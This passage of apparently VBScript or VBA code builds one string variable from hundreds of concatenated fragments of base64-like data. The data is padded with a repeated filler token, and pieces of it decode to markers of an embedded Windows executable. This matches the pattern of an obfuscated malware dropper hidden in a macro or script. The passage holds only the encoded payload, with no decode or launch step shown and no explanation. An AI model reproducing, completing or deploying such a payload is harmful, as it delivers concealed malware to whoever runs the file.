hTpxRu = hTpxRu & "$%@#$%@#$%U@#$%@#$%@#$%@#$%@#$%I@#$%@#$%" 
hTpxRu = hTpxRu & "@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%" 
hTpxRu = hTpxRu & "@#$%@#$%@#$%@#$%@#$%@#$%C@#$%@#$%@#$%G@#" 
hTpxRu = hTpxRu & "$%ucnNyYw@#$%@#$%@#$%CQD@#$%@#$%@#$%@#$%" 
hTpxRu = hTpxRu & "g@#$%@#$%@#$%@#$%@#$%Q@#$%@#$%@#$%BS@#$%" 
hTpxRu = hTpxRu & "@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%" 
hTpxRu = hTpxRu & "@#$%@#$%@#$%@#$%@#$%@#$%@#$%B@#$%@#$%@#$" 
hTpxRu = hTpxRu & "%B@#$%LnJlbG9j@#$%@#$%@#$%M@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%K@#$%@#$%@#$%@#$%@#$%C@#$%@#$%@#$" 
hTpxRu = hTpxRu & "%@#$%Vg@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%Q" 
hTpxRu = hTpxRu & "@#$%@#$%@#$%Qg@#$%@#$%@#$%@#$%@#$%@#$%@#" 
hTpxRu = hTpxRu & "$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#" 
hTpxRu = hTpxRu & "$%@#$%@#$%@#$%@#$%Qbg@#$%@#$%@#$%@#$%@#$" 
hTpxRu = hTpxRu & "%@#$%@#$%Eg@#$%@#$%@#$%@#$%C@#$%@#$%U@#$" 
hTpxRu = hTpxRu & "%9DY@#$%@#$%Ow1@#$%@#$%@#$%D@#$%@#$%@#$%" 
hTpxRu = hTpxRu & "@#$%@#$%@#$%@#$%@#$%@#$%OBs@#$%@#$%C4@#$" 
hTpxRu = hTpxRu & "%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$" 
hTpxRu = hTpxRu & "%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$" 
hTpxRu = hTpxRu & "%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$" 
hTpxRu = hTpxRu & "%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$" 
hTpxRu = hTpxRu & "%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$" 
hTpxRu = hTpxRu & "%@#$%@#$%@#$%@#$%@#$%@#$%D4r@#$%iYWKwImF" 
hTpxRu = hTpxRu & "gIo@#$%g@#$%@#$%Bio6KwImFv4J@#$%@#$%@#$%" 
hTpxRu = hTpxRu & "oDg@#$%@#$%Cio@#$%PisCJhYr@#$%iYW@#$%igE" 
hTpxRu = hTpxRu & "@#$%@#$%@#$%GKjor@#$%iYW/gk@#$%@#$%CgP@#" 
hTpxRu = hTpxRu & "$%@#$%@#$%KKg@#$%TM@#$%M@#$%r@#$%@#$%@#$" 
hTpxRu = hTpxRu & "%@#$%@#$%E@#$%@#$%BEr@#$%iYWKwImFigK@#$%" 
hTpxRu = hTpxRu & "@#$%@#$%GK@#$%s@#$%@#$%@#$%Y6Lg@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%CYgB@#$%@#$%@#$%@#$%DhK@#$%@#$%@#$%@#" 
hTpxRu = hTpxRu & "$%cx@#$%@#$%@#$%@#$%q@#$%@#$%g@#$%@#$%BC" 
hTpxRu = hTpxRu & "@#$%F@#$%@#$%@#$%@#$%ODY@#$%@#$%@#$%BzEQ" 
hTpxRu = hTpxRu & "@#$%@#$%Co@#$%B@#$%@#$%@#$%EON3///8mI@#$" 
hTpxRu = hTpxRu & "%I@#$%@#$%@#$%@#$%4H@#$%@#$%@#$%@#$%HMS@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%Kg@#$%M@#$%@#$%@#$%Q4O@#$%@#$" 
hTpxRu = hTpxRu & "%@#$%@#$%C@#$%E@#$%@#$%@#$%@#$%/g4@#$%@#" 
hTpxRu = hTpxRu & "$%P4M@#$%@#$%BFBw@#$%@#$%@#$%Kn///+z////" 
hTpxRu = hTpxRu & "lf///wo@#$%@#$%@#$%Cp////w////x4@#$%@#$%" 
hTpxRu = hTpxRu & "@#$%@#$%g@#$%w@#$%@#$%@#$%DjV////cxM@#$%" 
hTpxRu = hTpxRu & "@#$%@#$%q@#$%B@#$%@#$%@#$%BC@#$%G@#$%@#$" 
hTpxRu = hTpxRu & "%@#$%@#$%OMH///8qPisCJhZ+@#$%Q@#$%@#$%BG" 
hTpxRu = hTpxRu & "8U@#$%@#$%@#$%KKj4r@#$%iYWfgI@#$%@#$%@#$" 
hTpxRu = hTpxRu & "%RvFQ@#$%@#$%Cio+KwImFn4D@#$%@#$%@#$%Ebx" 
hTpxRu = hTpxRu & "Y@#$%@#$%@#$%oqPisCJhZ+B@#$%@#$%@#$%BG8X" 
hTpxRu = hTpxRu & "@#$%@#$%@#$%KKhor@#$%iYWFyo@#$%GisCJhYWK" 
hTpxRu = hTpxRu & "gDiKwImFn4G@#$%@#$%@#$%EFCgi@#$%@#$%@#$%" 
hTpxRu = hTpxRu & "GOR4@#$%@#$%@#$%By@#$%Q@#$%@#$%cN@#$%I@#" 
hTpxRu = hTpxRu & "$%@#$%@#$%CKCM@#$%@#$%@#$%ZvIw@#$%@#$%Cn" 
hTpxRu = hTpxRu & "Mk@#$%@#$%@#$%Kg@#$%Y@#$%@#$%@#$%R+Bg@#$" 
hTpxRu = hTpxRu & "%@#$%BCo@#$%@#$%@#$%@#$%qKwImFn4H@#$%@#$" 
hTpxRu = hTpxRu & "%@#$%EKg@#$%uKwImFgK@#$%Bw@#$%@#$%BCpOKw" 
hTpxRu = hTpxRu & "ImFgD+CQ@#$%@#$%/gkB@#$%Cgl@#$%@#$%@#$%K" 
hTpxRu = hTpxRu & "Kj4r@#$%iYW@#$%P4J@#$%@#$%@#$%oH@#$%@#$%" 
hTpxRu = hTpxRu & "@#$%CioaKwImFhcq@#$%Bor@#$%iYWFio@#$%dis" 
hTpxRu = hTpxRu & "CJhYr@#$%iYWcyc@#$%@#$%@#$%YoKQ@#$%@#$%B" 
hTpxRu = hTpxRu & "nQJ@#$%@#$%@#$%Cg@#$%g@#$%@#$%@#$%Qq@#$%" 
hTpxRu = hTpxRu & "@#$%@#$%+KwImFisCJhYCKCw@#$%@#$%@#$%YqKi" 
hTpxRu = hTpxRu & "sCJhZ+C@#$%@#$%@#$%BCo@#$%PisCJhY@#$%/gk" 
hTpxRu = hTpxRu & "@#$%@#$%Cgm@#$%@#$%@#$%KKhor@#$%iYWFyo@#" 
hTpxRu = hTpxRu & "$%GisCJhYWKg@#$%6KwImFv4J@#$%@#$%@#$%oJw" 
hTpxRu = hTpxRu & "@#$%@#$%Cio@#$%KisCJhYoLg@#$%@#$%Bio@#$%" 
hTpxRu = hTpxRu & "LisCJhY@#$%KCg@#$%@#$%@#$%YqPisCJhYr@#$%" 
hTpxRu = hTpxRu & "iYW@#$%igx@#$%@#$%@#$%GKhswDwDKB@#$%@#$%" 
hTpxRu = hTpxRu & "@#$%B@#$%@#$%@#$%ESsCJhYg@#$%@#$%w@#$%@#" 
hTpxRu = hTpxRu & "$%Cgy@#$%@#$%@#$%Gcyg@#$%@#$%@#$%olKDM@#" 
hTpxRu = hTpxRu & "$%@#$%@#$%YoN@#$%@#$%@#$%BgIoNQ@#$%@#$%B" 
hTpxRu = hTpxRu & "nIh@#$%@#$%Bwci0@#$%@#$%H@#$%oNg@#$%@#$%" 
hTpxRu = hTpxRu & "BnIx@#$%@#$%Bwcj8@#$%@#$%H@#$%oNg@#$%@#$" 
hTpxRu = hTpxRu & "%BnJD@#$%@#$%Bwck8@#$%@#$%H@#$%oNg@#$%@#" 
hTpxRu = hTpxRu & "$%BnJT@#$%@#$%Bwcl8@#$%@#$%H@#$%oNg@#$%@" 
hTpxRu = hTpxRu & "#$%BnJj@#$%@#$%BwcnU@#$%@#$%H@#$%oNg@#$%" 
hTpxRu = hTpxRu & "@#$%BnJ5@#$%@#$%Bwcos@#$%@#$%H@#$%oNg@#$" 
hTpxRu = hTpxRu & "%@#$%BnKP@#$%@#$%BwcqE@#$%@#$%H@#$%oNg@#" 
hTpxRu = hTpxRu & "$%@#$%BnKl@#$%@#$%BwcrE@#$%@#$%H@#$%oNg@" 
hTpxRu = hTpxRu & "#$%@#$%BnK1@#$%@#$%Bwcsc@#$%@#$%H@#$%oNg" 
hTpxRu = hTpxRu & "@#$%@#$%BnLL@#$%@#$%Bwct0@#$%@#$%H@#$%oN" 
hTpxRu = hTpxRu & "g@#$%@#$%BnLh@#$%@#$%BwcvM@#$%@#$%H@#$%o" 
hTpxRu = hTpxRu & "Ng@#$%@#$%Big3@#$%@#$%@#$%GCgYoO@#$%@#$%" 
hTpxRu = hTpxRu & "@#$%BgsHKDU@#$%@#$%@#$%YL@#$%3Kx@#$%@#$%" 
hTpxRu = hTpxRu & "BwFig5@#$%@#$%@#$%GOsk@#$%@#$%@#$%@#$%fG" 
hTpxRu = hTpxRu & "ig6@#$%@#$%@#$%GJXL3@#$%@#$%BwKDs@#$%@#$" 
hTpxRu = hTpxRu & "%@#$%YTBBIE/hYj@#$%@#$%@#$%Bbx0@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%py+w@#$%@#$%cCg8@#$%@#$%@#$%GDHIF@#$%" 
hTpxRu = hTpxRu & "QBwKD0@#$%@#$%@#$%Yo@#$%w@#$%@#$%Kzp@#$%" 
hTpxRu = hTpxRu & "@#$%@#$%@#$%@#$%cyo@#$%@#$%@#$%pzKw@#$%@" 
hTpxRu = hTpxRu & "#$%ChMFEQUXKD4@#$%@#$%@#$%YRBXIR@#$%QBwK" 
hTpxRu = hTpxRu & "D8@#$%@#$%@#$%YRBXKF@#$%QBwCCh@#$%@#$%@#" 
hTpxRu = hTpxRu & "$%@#$%GKEE@#$%@#$%@#$%YlEQUoQg@#$%@#$%Bi" 
hTpxRu = hTpxRu & "hD@#$%@#$%@#$%GJn4s@#$%@#$%@#$%KcvcB@#$%" 
hTpxRu = hTpxRu & "H@#$%XKEQ@#$%@#$%@#$%YNCShF@#$%@#$%@#$%G" 
hTpxRu = hTpxRu & "clMC@#$%H@#$%oB@#$%@#$%@#$%KzoM@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%CXJT@#$%gBwCChG@#$%@#$%@#$%GCShH@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%GByhI@#$%@#$%@#$%GKEk@#$%@#$%" 
hTpxRu = hTpxRu & "@#$%YmOPsC@#$%@#$%@#$%Ecsc@#$%@#$%H@#$%W" 
hTpxRu = hTpxRu & "KDk@#$%@#$%@#$%Y63gI@#$%@#$%B8aKDo@#$%@#" 
hTpxRu = hTpxRu & "$%@#$%YTBhEGcy4@#$%@#$%@#$%pyBQE@#$%cChK" 
hTpxRu = hTpxRu & "@#$%@#$%@#$%GK@#$%U@#$%@#$%Cs6qQI@#$%@#$" 
hTpxRu = hTpxRu & "%Cg7@#$%@#$%@#$%GEwQSBP4WIw@#$%@#$%@#$%W" 
hTpxRu = hTpxRu & "8d@#$%@#$%@#$%Kcvs@#$%@#$%H@#$%oQ@#$%@#$" 
hTpxRu = hTpxRu & "%@#$%BhMHEQZy9w@#$%@#$%cBEHKEs@#$%@#$%@#" 
hTpxRu = hTpxRu & "$%YTCHMq@#$%@#$%@#$%Kcys@#$%@#$%@#$%oTCR" 
hTpxRu = hTpxRu & "EJFyg+@#$%@#$%@#$%GEQlyEQE@#$%cCg/@#$%@#" 
hTpxRu = hTpxRu & "$%@#$%GEQlyhQE@#$%cBEIKE@#$%@#$%@#$%@#$%" 
hTpxRu = hTpxRu & "YoQQ@#$%@#$%BiURCShC@#$%@#$%@#$%GKEM@#$%" 
hTpxRu = hTpxRu & "@#$%@#$%YmFBMKcl0C@#$%HByeQI@#$%cChM@#$%" 
hTpxRu = hTpxRu & "@#$%@#$%GKE0@#$%@#$%@#$%YTCt0S@#$%@#$%@#" 
hTpxRu = hTpxRu & "$%@#$%JShO@#$%@#$%@#$%GEwsoTw@#$%@#$%Bt0" 
hTpxRu = hTpxRu & "@#$%@#$%@#$%@#$%@#$%EQo5@#$%QI@#$%@#$%BQ" 
hTpxRu = hTpxRu & "TDBEKFHJ7@#$%gBwF40T@#$%@#$%@#$%BJRZymQI" 
hTpxRu = hTpxRu & "@#$%cKIUFBQoU@#$%@#$%@#$%BihR@#$%@#$%@#$" 
hTpxRu = hTpxRu & "%GcqkC@#$%H@#$%RCChS@#$%@#$%@#$%GKDs@#$%" 
hTpxRu = hTpxRu & "@#$%@#$%aMIw@#$%@#$%@#$%ShT@#$%@#$%@#$%G" 
hTpxRu = hTpxRu & "Ew0RDShU@#$%@#$%@#$%GEw4RDihV@#$%@#$%@#$" 
hTpxRu = hTpxRu & "%GOngB@#$%@#$%@#$%RChRyxQI@#$%cBeNEw@#$%" 
hTpxRu = hTpxRu & "@#$%@#$%SUWEQ6iJRMPFBQXjQQ@#$%@#$%@#$%El" 
hTpxRu = hTpxRu & "FhecJRMQKF@#$%@#$%@#$%@#$%YREBaROR8@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%RDxaaKE0@#$%@#$%@#$%bQCQ@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%ShW@#$%@#$%@#$%GKFc@#$%@#$%@#$%Z0" 
hTpxRu = hTpxRu & "CQ@#$%@#$%@#$%RMOKE0@#$%@#$%@#$%YTDBEMFH" 
hTpxRu = hTpxRu & "Lj@#$%gBwF40T@#$%@#$%@#$%BJRZy/QI@#$%cKI" 
hTpxRu = hTpxRu & "UFChY@#$%@#$%@#$%GEQwUchkD@#$%H@#$%XjRM@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%ElFh8lKDo@#$%@#$%@#$%ZyLwM@#$" 
hTpxRu = hTpxRu & "%cHJT@#$%wBwcl0D@#$%H@#$%oWQ@#$%@#$%BqIU" 
hTpxRu = hTpxRu & "FChY@#$%@#$%@#$%GEQwUcnsD@#$%H@#$%XjRM@#" 
hTpxRu = hTpxRu & "$%@#$%@#$%ElFnKP@#$%wBwEQwUchkD@#$%H@#$%" 
hTpxRu = hTpxRu & "WjRM@#$%@#$%@#$%EUFBQoU@#$%@#$%@#$%BihN@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%GEQgoWg@#$%@#$%BihT@#$%@#$%@#" 
hTpxRu = hTpxRu & "$%GohQUKFg@#$%@#$%@#$%YRDBRyKgQ@#$%cBeNE" 
hTpxRu = hTpxRu & "w@#$%@#$%@#$%SUWEQwUchkD@#$%H@#$%WjRM@#$" 
hTpxRu = hTpxRu & "%@#$%@#$%EUFBQoU@#$%@#$%@#$%BihR@#$%@#$%" 
hTpxRu = hTpxRu & "@#$%GKFs@#$%@#$%@#$%aiFBQoW@#$%@#$%@#$%B" 
hTpxRu = hTpxRu & "hEMFHJMB@#$%BwF40T@#$%@#$%@#$%BJRZyZ@#$%" 
hTpxRu = hTpxRu & "Q@#$%cKIUFChY@#$%@#$%@#$%GEQwUcngE@#$%H@" 
hTpxRu = hTpxRu & "#$%XjRM@#$%@#$%@#$%ElFhaM@#$%w@#$%@#$%@#" 
hTpxRu = hTpxRu & "$%aIUFChY@#$%@#$%@#$%GEQwUcp@#$%E@#$%H@#" 
hTpxRu = hTpxRu & "$%WjRM@#$%@#$%@#$%EUFBQXKFw@#$%@#$%@#$%Y" 
hTpxRu = hTpxRu & "m3RI@#$%@#$%@#$%@#$%lKE4@#$%@#$%@#$%YTES" 
hTpxRu = hTpxRu & "hP@#$%@#$%@#$%G3Q@#$%@#$%@#$%@#$%DdFQ@#$" 
hTpxRu = hTpxRu & "%@#$%@#$%BEMOQ0@#$%@#$%@#$%@#$%RDChN@#$%" 
hTpxRu = hTpxRu & "@#$%@#$%GKF0@#$%@#$%@#$%Ym3@#$%coS@#$%@#" 
hTpxRu = hTpxRu & "$%@#$%BihJ@#$%@#$%@#$%GJjgM@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%ByhI@#$%@#$%@#$%GKEk@#$%@#$%@#$%Ym3RI" 
hTpxRu = hTpxRu & "@#$%@#$%@#$%@#$%lKE4@#$%@#$%@#$%YTEihP@#" 
hTpxRu = hTpxRu & "$%@#$%@#$%G3Q@#$%@#$%@#$%@#$%@#$%q@#$%@#" 
hTpxRu = hTpxRu & "$%BBZ@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%G@#" 
hTpxRu = hTpxRu & "$%C@#$%@#$%@#$%b@#$%@#$%@#$%@#$%ewI@#$%@" 
hTpxRu = hTpxRu & "#$%BI@#$%@#$%@#$%@#$%l@#$%@#$%@#$%B@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%O@#$%C@#$%@#$%CJ@#$%Q@#$%" 
hTpxRu = hTpxRu & "@#$%aQQ@#$%@#$%BI@#$%@#$%@#$%@#$%l@#$%@#" 
hTpxRu = hTpxRu & "$%@#$%B@#$%g@#$%@#$%@#$%O@#$%C@#$%@#$%Cg" 
hTpxRu = hTpxRu & "@#$%Q@#$%@#$%g@#$%Q@#$%@#$%BU@#$%@#$%@#$" 
hTpxRu = hTpxRu & "%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$" 
hTpxRu = hTpxRu & "%@#$%@#$%Q@#$%@#$%@#$%CzB@#$%@#$%@#$%twQ" 
hTpxRu = hTpxRu & "@#$%@#$%BI@#$%@#$%@#$%@#$%l@#$%@#$%@#$%B" 
hTpxRu = hTpxRu & "OisCJhb+CQ@#$%@#$%KB4@#$%@#$%@#$%oq@#$%D" 
hTpxRu = hTpxRu & "4r@#$%iYW@#$%P4J@#$%@#$%@#$%oLw@#$%@#$%C" 
hTpxRu = hTpxRu & "iouKwImFg@#$%oM@#$%@#$%@#$%CipKKwImFv4J@" 
hTpxRu = hTpxRu & "#$%@#$%D+CQE@#$%bzE@#$%@#$%@#$%oq@#$%D4r" 
hTpxRu = hTpxRu & "@#$%iYW@#$%P4J@#$%@#$%@#$%oMg@#$%@#$%Cip" 
hTpxRu = hTpxRu & "aKwImFv4J@#$%@#$%D+CQE@#$%/gkC@#$%G8z@#$" 
hTpxRu = hTpxRu & "%@#$%@#$%KKg@#$%6KwImFv4J@#$%@#$%BvN@#$%" 
hTpxRu = hTpxRu & "@#$%@#$%Cio@#$%SisCJhb+CQ@#$%@#$%/gkB@#$" 
hTpxRu = hTpxRu & "%G81@#$%@#$%@#$%KKgBeKwImFgD+CQ@#$%@#$%/" 
hTpxRu = hTpxRu & "gkB@#$%P4J@#$%g@#$%oNg@#$%@#$%Cio+KwImFg" 
hTpxRu = hTpxRu & "D+CQ@#$%@#$%KDc@#$%@#$%@#$%oqLisCJhY@#$%" 
hTpxRu = hTpxRu & "KDg@#$%@#$%@#$%oqbisCJhY@#$%/gk@#$%@#$%P" 
hTpxRu = hTpxRu & "4J@#$%QD+CQI@#$%/gkD@#$%Cg5@#$%@#$%@#$%K" 
hTpxRu = hTpxRu & "Kk4r@#$%iYW@#$%P4J@#$%@#$%D+CQE@#$%KDo@#" 
hTpxRu = hTpxRu & "$%@#$%@#$%oqSisCJhb+CQ@#$%@#$%/gkB@#$%G8" 
hTpxRu = hTpxRu & "7@#$%@#$%@#$%KKgBKKwImFv4J@#$%@#$%D+CQE@" 
hTpxRu = hTpxRu & "#$%bzw@#$%@#$%@#$%oq@#$%E4r@#$%iYW@#$%P4" 
hTpxRu = hTpxRu & "J@#$%@#$%D+CQE@#$%KD0@#$%@#$%@#$%oqSisCJ" 
hTpxRu = hTpxRu & "hb+CQ@#$%@#$%/gkB@#$%G8+@#$%@#$%@#$%KKgB" 
hTpxRu = hTpxRu & "KKwImFv4J@#$%@#$%D+CQE@#$%bz8@#$%@#$%@#$" 
hTpxRu = hTpxRu & "%oq@#$%Dor@#$%iYW/gk@#$%@#$%G9@#$%@#$%@#" 
hTpxRu = hTpxRu & "$%@#$%KKgBaKwImFv4J@#$%@#$%D+CQE@#$%/gkC" 
hTpxRu = hTpxRu & "@#$%G9B@#$%@#$%@#$%KKg@#$%6KwImFv4J@#$%@" 
hTpxRu = hTpxRu & "#$%BvQg@#$%@#$%Cio@#$%WisCJhb+CQ@#$%@#$%" 
hTpxRu = hTpxRu & "/gkB@#$%P4J@#$%gBvQw@#$%@#$%Cio@#$%OisCJ" 
hTpxRu = hTpxRu & "hb+CQ@#$%@#$%b0Q@#$%@#$%@#$%oq@#$%D4r@#$" 
hTpxRu = hTpxRu & "%iYW@#$%P4J@#$%@#$%@#$%oRQ@#$%@#$%Cio+Kw" 
hTpxRu = hTpxRu & "ImFgD+CQ@#$%@#$%KGs@#$%@#$%@#$%YqSisCJhb" 
hTpxRu = hTpxRu & "+CQ@#$%@#$%/gkB@#$%G9G@#$%@#$%@#$%KKgBeK" 
hTpxRu = hTpxRu & "wImFgD+CQ@#$%@#$%/gkB@#$%P4J@#$%g@#$%oRw" 
hTpxRu = hTpxRu & "@#$%@#$%CipOKwImFgD+CQ@#$%@#$%/gkB@#$%Ch" 
hTpxRu = hTpxRu & "I@#$%@#$%@#$%KKj4r@#$%iYW@#$%P4J@#$%@#$%" 
hTpxRu = hTpxRu & "@#$%oGQ@#$%@#$%Cio+KwImFgD+CQ@#$%@#$%KEk" 
hTpxRu = hTpxRu & "@#$%@#$%@#$%oqLisCJhY@#$%KEo@#$%@#$%@#$%" 
hTpxRu = hTpxRu & "oqnisCJhY@#$%/gk@#$%@#$%P4J@#$%QD+CQI@#$" 
hTpxRu = hTpxRu & "%/gkD@#$%P4JB@#$%D+CQU@#$%/gkG@#$%ChL@#$" 
hTpxRu = hTpxRu & "%@#$%@#$%KKj4r@#$%iYW@#$%P4J@#$%@#$%@#$%" 
hTpxRu = hTpxRu & "oT@#$%@#$%@#$%Cio+KwImFgD+CQ@#$%@#$%KE0@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%oqXisCJhY@#$%/gk@#$%@#$%P4J@#" 
hTpxRu = hTpxRu & "$%QD+CQI@#$%KE4@#$%@#$%@#$%oqTisCJhY@#$%" 
hTpxRu = hTpxRu & "/gk@#$%@#$%P4J@#$%Q@#$%oTw@#$%@#$%Cio+Kw" 
hTpxRu = hTpxRu & "ImFgD+CQ@#$%@#$%KF@#$%@#$%@#$%@#$%oqPisC" 
hTpxRu = hTpxRu & "JhY@#$%/gk@#$%@#$%Cgc@#$%@#$%@#$%KKk4r@#" 
hTpxRu = hTpxRu & "$%iYW@#$%P4J@#$%@#$%D+CQE@#$%KFE@#$%@#$%" 
hTpxRu = hTpxRu & "@#$%oqjisCJhY@#$%/gk@#$%@#$%P4J@#$%QD+CQ" 
hTpxRu = hTpxRu & "I@#$%/gkD@#$%P4JB@#$%D+CQU@#$%KFI@#$%@#$" 
hTpxRu = hTpxRu & "%@#$%oqbisCJhY@#$%/gk@#$%@#$%P4J@#$%QD+C" 
hTpxRu = hTpxRu & "QI@#$%/gkD@#$%ChT@#$%@#$%@#$%KKj4r@#$%iY" 
hTpxRu = hTpxRu & "W@#$%P4J@#$%@#$%@#$%oV@#$%@#$%@#$%Cio+Kw" 
hTpxRu = hTpxRu & "ImFgD+CQ@#$%@#$%KFU@#$%@#$%@#$%oq@#$%z@#" 
hTpxRu = hTpxRu & "$%J@#$%Cs@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$" 
hTpxRu = hTpxRu & "%@#$%KwImFgD+CQ@#$%@#$%/gkB@#$%P4J@#$%gD" 
hTpxRu = hTpxRu & "+CQM@#$%/gkE@#$%P4JBQD+CQY@#$%/gkH@#$%Ch" 
hTpxRu = hTpxRu & "W@#$%@#$%@#$%KKg@#$%+KwImFgD+CQ@#$%@#$%K" 
hTpxRu = hTpxRu & "Fc@#$%@#$%@#$%oqGisCJhYXKg@#$%aKwImFhYq@" 
hTpxRu = hTpxRu & "#$%D4r@#$%iYWKwImFgIobQ@#$%@#$%BioTM@#$%" 
hTpxRu = hTpxRu & "U@#$%k@#$%E@#$%@#$%@#$%U@#$%@#$%BEr@#$%i" 
hTpxRu = hTpxRu & "YWFyhz@#$%@#$%@#$%GOi8@#$%@#$%@#$%@#$%mI" 
hTpxRu = hTpxRu & "@#$%k@#$%@#$%@#$%@#$%4HQE@#$%@#$%BcKI@#$" 
hTpxRu = hTpxRu & "%E@#$%@#$%@#$%@#$%4EQE@#$%@#$%BEEflg@#$%" 
hTpxRu = hTpxRu & "@#$%@#$%oCFyhx@#$%@#$%@#$%GObE@#$%@#$%@#" 
hTpxRu = hTpxRu & "$%@#$%43P///yYgB@#$%@#$%@#$%@#$%Dju@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%c1k@#$%@#$%@#$%oIjmkobg@#$%@#" 
hTpxRu = hTpxRu & "$%Bg0gCg@#$%@#$%@#$%DjW@#$%@#$%@#$%@#$%E" 
hTpxRu = hTpxRu & "QUbPr3///8gBg@#$%@#$%@#$%Chz@#$%@#$%@#$%" 
hTpxRu = hTpxRu & "GOr8@#$%@#$%@#$%@#$%4ug@#$%@#$%@#$%@#$%c" 
hTpxRu = hTpxRu & "ICZoobw@#$%@#$%BhMEI@#$%M@#$%@#$%@#$%@#$" 
hTpxRu = hTpxRu & "%WOaQ@#$%@#$%@#$%@#$%mHo0J@#$%@#$%@#$%BJ" 
hTpxRu = hTpxRu & "RZymgQ@#$%cKIlF3K2B@#$%BwoiUYcuQE@#$%HCi" 
hTpxRu = hTpxRu & "JRly+gQ@#$%cKIlGnIOBQBwoiUbch4F@#$%HCiJR" 
hTpxRu = hTpxRu & "xyNgU@#$%cKIlHXJMBQBwogwgC@#$%@#$%@#$%@#" 
hTpxRu = hTpxRu & "$%DhS@#$%@#$%@#$%@#$%OKQ@#$%@#$%@#$%@#$%" 
hTpxRu = hTpxRu & "RBRfWEwUg@#$%g@#$%@#$%@#$%Chy@#$%@#$%@#$" 
hTpxRu = hTpxRu & "%GOjg@#$%@#$%@#$%@#$%mFgogDQ@#$%@#$%@#$%" 
hTpxRu = hTpxRu & "Dgr@#$%@#$%@#$%@#$%EQRzWg@#$%@#$%Cihw@#$" 
hTpxRu = hTpxRu & "%@#$%@#$%GI@#$%w@#$%@#$%@#$%@#$%4FQ@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%BcTBTj8/v//I@#$%k@#$%@#$%@#$%D+Dg" 
hTpxRu = hTpxRu & "Y@#$%/gwG@#$%EUO@#$%@#$%@#$%@#$%Cg@#$%@#" 
hTpxRu = hTpxRu & "$%@#$%HH////t/v//mP///6b+//+y/v//jP///8X" 
hTpxRu = hTpxRu & "+///V/v//Cg@#$%@#$%@#$%@#$%n///8g////rv/" 
hTpxRu = hTpxRu & "//xo@#$%@#$%@#$%@#$%gBQ@#$%@#$%@#$%Di5//" 
hTpxRu = hTpxRu & "//cmQF@#$%H@#$%LI@#$%s@#$%@#$%@#$%@#$%4q" 
hTpxRu = hTpxRu & "f///wYqGz@#$%L@#$%LoG@#$%@#$%@#$%G@#$%@#" 
hTpxRu = hTpxRu & "$%@#$%RKwImFi@#$%G@#$%@#$%@#$%@#$%OBoG@#" 
hTpxRu = hTpxRu & "$%@#$%@#$%DKHc@#$%@#$%@#$%Y6tgQ@#$%@#$%C" 
hTpxRu = hTpxRu & "@#$%u@#$%@#$%@#$%@#$%OM@#$%B@#$%@#$%@#$%" 
hTpxRu = hTpxRu & "RFBfaF9aNNw@#$%@#$%@#$%RMWI@#$%4@#$%@#$%" 
hTpxRu = hTpxRu & "@#$%@#$%ocg@#$%@#$%Bjqk@#$%Q@#$%@#$%JnNb" 
hTpxRu = hTpxRu & "@#$%@#$%@#$%KehEOHyjWEw4g@#$%g@#$%@#$%@#" 
hTpxRu = hTpxRu & "$%DiM@#$%Q@#$%@#$%EQR7CQ@#$%@#$%BBEJKGg@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%Y57@#$%I@#$%@#$%C@#$%f@#$%@#$" 
hTpxRu = hTpxRu & "%@#$%@#$%OG8B@#$%@#$%@#$%oeg@#$%@#$%Bhp@" 
hTpxRu = hTpxRu & "#$%WwM@#$%@#$%C@#$%c@#$%@#$%@#$%@#$%KHI@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%Y6VQE@#$%@#$%CYIcs@#$%F@#$%H@" 
hTpxRu = hTpxRu & "#$%DKHg@#$%@#$%@#$%YMIBc@#$%@#$%@#$%@#$%" 
hTpxRu = hTpxRu & "ocw@#$%@#$%Bjo4@#$%Q@#$%@#$%ODMB@#$%@#$%" 
hTpxRu = hTpxRu & "@#$%WExIgGg@#$%@#$%@#$%Dgm@#$%Q@#$%@#$%c" 
hTpxRu = hTpxRu & "1s@#$%@#$%@#$%p6EQR7CQ@#$%@#$%BBENBBELEg" 
hTpxRu = hTpxRu & "EoZw@#$%@#$%Bjrs@#$%@#$%@#$%@#$%ICE@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%4/g@#$%@#$%@#$%HNb@#$%@#$%@#$" 
hTpxRu = hTpxRu & "%KehEEewo@#$%@#$%@#$%Qoag@#$%@#$%BhV@#$%" 
hTpxRu = hTpxRu & "w@#$%Q@#$%@#$%C@#$%v@#$%@#$%@#$%@#$%ONw@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%RBHsJ@#$%@#$%@#$%EFhEKI@#" 
hTpxRu = hTpxRu & "$%@#$%w@#$%@#$%@#$%fQChp@#$%@#$%@#$%GEw0" 
hTpxRu = hTpxRu & "XKHM@#$%@#$%@#$%Y68QE@#$%@#$%CYgBw@#$%@#" 
